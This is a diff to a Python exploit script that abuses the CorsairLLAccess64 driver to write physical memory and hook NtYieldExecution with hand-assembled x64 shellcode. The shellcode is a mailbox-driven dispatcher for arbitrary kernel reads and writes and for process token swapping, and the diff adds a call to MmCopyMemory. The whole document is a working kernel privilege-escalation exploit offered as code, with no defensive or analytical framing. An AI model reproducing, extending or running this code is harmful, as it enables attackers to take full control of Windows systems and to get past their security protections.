@@ -43,69 +43,93 @@ def write_phys(h, pa, data):
         dst[i] = data[i]
     return True
 
-def construct_dispatcher_stub():
+def construct_dispatcher_stub(mm_copy_addr=0):
     """
     Constructs the Phase 2 Command Dispatcher Shellcode.
     Mailbox Layout:
     +0x00: Command ID (4 bytes)
     +0x04: Status (4 bytes)
-    +0x10: Arg1 (8 bytes) - e.g., Physical Address
-    +0x18: Arg2 (8 bytes) - e.g., Value
-    +0x20: Result (8 bytes)
-    +0x30: Heartbeat (1 byte) - 0x77
+    +0x10: Arg1 (8 bytes) - e.g., Target Address
+    +0x18: Arg2 (8 bytes) - e.g., Source Address
+    +0x20: Arg3 (8 bytes) - e.g., Size
+    +0x28: Arg4 (8 bytes) - e.g., Flags
+    +0x30: Result (8 bytes) - e.g., Bytes Transferred
+    +0x40: Heartbeat (1 byte) - 0x77
     """
     
+    # We need to preserve volatile registers used by MmCopyMemory
+    # rcx, rdx, r8, r9 are args. rax is return.
+    
     stub = [
-        0x50, 0x51, 0x52, 0x41, 0x50,               # push rax, rcx, rdx, r8
-        0x48, 0xB9,                                 # mov rcx, MAILBOX_VA
+        0x50, 0x51, 0x52, 0x53, 0x41, 0x50, 0x41, 0x51, # push rax, rcx, rdx, rbx, r8, r9
+        0x48, 0x83, 0xEC, 0x28,                         # sub rsp, 28h (Shadow space)
+        0x48, 0xB9,                                     # mov rcx, MAILBOX_VA
     ] + list(struct.pack("<Q", MAILBOX_VA)) + [
-        0x8B, 0x01,                                 # mov eax, [rcx] (Command ID)
-        0x85, 0xC0,                                 # test eax, eax
-        0x74, 0x30,                                 # jz heartbeat (Offset to be calculated)
+        0x8B, 0x01,                                     # mov eax, [rcx] (Command ID)
+        0x85, 0xC0,                                     # test eax, eax
+        0x74, 0x50,                                     # jz heartbeat (Patched offset)
         
         # Dispatcher Logic
-        0x83, 0xF8, 0x01,                           # cmp eax, 1 (Read Virtual)
-        0x74, 0x0A,                                 # je cmd_read
-        0x83, 0xF8, 0x02,                           # cmp eax, 2 (Write Virtual)
-        0x74, 0x14,                                 # je cmd_write
+        0x83, 0xF8, 0x01,                           # cmp eax, 1 (Read 64-bit)
+        0x74, 0x0E,                                 # je cmd_read
+        0x83, 0xF8, 0x02,                           # cmp eax, 2 (Write 64-bit)
+        0x74, 0x18,                                 # je cmd_write
         0x83, 0xF8, 0x03,                           # cmp eax, 3 (Token Swap)
-        0x74, 0x22,                                 # je cmd_swap
-        0xEB, 0x2E,                                 # jmp clear_cmd
+        0x74, 0x26,                                 # je cmd_swap
+        0x83, 0xF8, 0x04,                           # cmp eax, 4 (MmCopyMemory)
+        0x74, 0x30,                                 # je cmd_copy
+        0xEB, 0x42,                                 # jmp clear_cmd
         
-        # Command 0x01: Read Virtual
-        # TargetVA = [rcx + 0x10]
-        # Result   = [rcx + 0x20]
+        # Command 0x01: Read 64-bit
         # cmd_read:
         0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
         0x48, 0x8B, 0x12,                           # mov rdx, [rdx]
-        0x48, 0x89, 0x51, 0x20,                     # mov [rcx + 0x20], rdx
-        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
-        0xEB, 0x1E,                                 # jmp clear_cmd
+        0x48, 0x89, 0x51, 0x30,                     # mov [rcx + 0x30], rdx
+        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0
+        0xEB, 0x32,                                 # jmp clear_cmd
 
-        # Command 0x02: Write Virtual
-        # TargetVA = [rcx + 0x10]
-        # Value    = [rcx + 0x18]
+        # Command 0x02: Write 64-bit
         # cmd_write:
         0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
         0x4C, 0x8B, 0x41, 0x18,                     # mov r8, [rcx + 0x18]
         0x49, 0x89, 0x02,                           # mov [rdx], r8
-        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
-        0xEB, 0x0E,                                 # jmp clear_cmd
+        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0
+        0xEB, 0x22,                                 # jmp clear_cmd
         
         # Command 0x03: Token Swap
         # cmd_swap:
         0x48, 0x8B, 0x51, 0x10,                     # mov rdx, [rcx + 0x10]
         0x4C, 0x8B, 0x41, 0x18,                     # mov r8, [rcx + 0x18]
         0x49, 0x89, 0x02,                           # mov [rdx], r8
-        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0 (Status=OK)
+        0xC7, 0x41, 0x04, 0x00, 0x00, 0x00, 0x00,   # mov dword ptr [rcx + 0x04], 0
+        0xEB, 0x12,                                 # jmp clear_cmd
+
+        # Command 0x04: MmCopyMemory
+        # cmd_copy:
+        # rcx is already MAILBOX_VA. We need to preserve it for status update.
+        0x48, 0x89, 0xCB,                           # mov rbx, rcx (Save Mailbox VA)
+        0x48, 0x8B, 0x4B, 0x10,                     # mov rcx, [rbx + 0x10] (Target)
+        0x48, 0x8B, 0x53, 0x18,                     # mov rdx, [rbx + 0x18] (Source - Part 1)
+        0x4C, 0x8B, 0x43, 0x20,                     # mov r8, [rbx + 0x20]  (Size)
+        0x44, 0x8B, 0x4B, 0x28,                     # mov r9d, [rbx + 0x28] (Flags)
+        # Stack Arg: NumberOfBytesTransferred
+        0x48, 0x8D, 0x43, 0x30,                     # lea rax, [rbx + 0x30]
+        0x48, 0x89, 0x44, 0x24, 0x20,               # mov [rsp + 0x20], rax
+        
+        0x48, 0xB8,                                 # mov rax, MmCopyMemory
+    ] + list(struct.pack("<Q", mm_copy_addr)) + [
+        0xFF, 0xD0,                                 # call rax
+        0x89, 0x43, 0x04,                           # mov [rbx + 0x04], eax (Store NTSTATUS)
+        0x48, 0x89, 0xD9,                           # mov rcx, rbx (Restore rcx)
         
         # clear_cmd:
         0xC7, 0x01, 0x00, 0x00, 0x00, 0x00,         # mov dword ptr [rcx], 0 (Cmd=Idle)
         
         # heartbeat:
-        0xC6, 0x41, 0x30, 0x77,                     # mov byte ptr [rcx + 0x30], 0x77
+        0xC6, 0x41, 0x40, 0x77,                     # mov byte ptr [rcx + 0x40], 0x77
         
-        0x41, 0x58, 0x5A, 0x59, 0x58,               # pop r8, rdx, rcx, rax
+        0x48, 0x83, 0xC4, 0x28,                     # add rsp, 28h
+        0x41, 0x59, 0x41, 0x58, 0x5B, 0x5A, 0x59, 0x58, # pop r9, r8, rbx, rdx, rcx, rax
         
         # Original Preamble of NtYieldExecution
         0x48, 0x83, 0xEC, 0x28,                     # sub rsp, 28h
@@ -120,13 +144,19 @@ def construct_dispatcher_stub():
     return bytes(stub)
 
 def main():
+    if len(sys.argv) < 2:
+        print("Usage: python functional_stub.py <MmCopyMemory_Address>")
+        sys.exit(1)
+        
+    mm_copy_addr = int(sys.argv[1], 16)
+    
     h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
     if h == -1:
         print("[-] Driver not open")
         return
 
-    print(f"[*] Constructing Phase 2 Dispatcher Stub...")
-    stub = construct_dispatcher_stub()
+    print(f"[*] Constructing Phase 2 Dispatcher Stub (with MmCopyMemory at 0x{mm_copy_addr:X})...")
+    stub = construct_dispatcher_stub(mm_copy_addr)
     print(f"[*] Stub size: {len(stub)} bytes")
 
     print(f"[*] Writing upgraded stub to cave at PA 0x{CAVE_PA:X}...")
